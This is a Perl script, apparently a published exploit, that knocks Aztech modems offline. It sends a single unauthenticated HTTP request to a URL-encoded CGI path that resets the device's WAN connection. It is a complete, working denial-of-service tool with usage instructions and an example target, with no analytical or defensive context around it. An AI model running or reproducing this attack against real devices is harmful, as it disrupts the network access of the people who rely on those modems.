#!/usr/bin/perl
use strict;
use IO::Socket;

if(!defined($ARGV[0])) {
system ('clear');
print "---------------------------------------------\n";
print "++ Aztech Modem Denial of Service Attack\n";
print "++ Usage: perl $0 TARGET:PORT\n";
print "++ Ex: perl $0 192.168.254.254:80\n\n";
exit;
}

my $TARGET = $ARGV[0];
my ($HOST, $PORT)= split(':',$TARGET);
my $PATH = "%2f%63%67%69%2d%62%69%6e%2f%41%5a%5f%52%65%74%72%61%69%6e%2e%63%67%69";

system ('clear');
print "---------------------------------------------\n";
print "++ Resetting WAN modem $TARGET\n";

my $POST = "GET $PATH HTTP/1.1";
my $ACCEPT = "Accept: text/html";

my $sock = new IO::Socket::INET ( PeerAddr => "$HOST",PeerPort => "$PORT",Proto => "tcp"); die "[-] Can't creat socket: $!\n" unless $sock;

print $sock "$POST\n";
print $sock "$ACCEPT\n\n";
print "++ Sent. The modem should be disconnected by now.\n";
$sock->close();

exit;


